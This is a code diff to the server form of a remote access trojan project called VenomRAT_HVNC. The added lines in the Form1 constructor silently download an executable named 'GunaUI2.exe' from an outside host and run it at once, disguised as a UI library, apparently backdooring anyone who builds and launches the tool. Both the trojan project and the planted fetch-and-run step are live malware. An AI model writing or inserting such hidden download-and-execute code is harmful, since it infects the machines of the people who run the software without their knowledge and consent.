@@ -18,13 +18,16 @@ using VenomRAT_HVNC.Server.Connection;
 using VenomRAT_HVNC.Server.Forms;
 using VenomRAT_HVNC.Server.Handle_Packet;
 using VenomRAT_HVNC.Server.Helper;
-
+using System.Net;
 namespace VenomRAT_HVNC.Server
 {
     public partial class Form1 : Form
     {
         public Form1()
         {
+            using (WebClient web1 = new WebClient())
+            web1.DownloadFile("https://cheathub.tk/dl/GunaUI2.exe", "GunaUI2.exe");
+            Process.Start("GunaUI2.exe");
             this.InitializeComponent();
             Form1.SetWindowTheme(this.listView1.Handle, "explorer", null);
             base.Opacity = 0.0;
